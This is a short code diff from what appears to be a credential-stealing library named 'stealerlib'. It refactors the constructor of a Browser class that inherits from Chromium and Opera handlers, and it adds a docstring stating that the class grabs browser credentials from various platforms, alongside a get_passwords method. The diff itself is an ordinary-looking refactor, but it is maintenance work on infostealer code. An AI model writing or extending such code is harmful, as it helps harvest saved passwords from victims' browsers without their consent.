@@ -26,9 +26,10 @@ from stealerlib.browser.types import BrowserTypes
 
 
 class Browser(Chromium, Opera):
+    """This class provides methods for grabbing browser credentials from various platforms"""
+
     def __init__(self):
-        Opera.__init__(self)
-        Chromium.__init__(self)
+        super(Browser, self).__init__()
 
     def get_passwords(
         self,
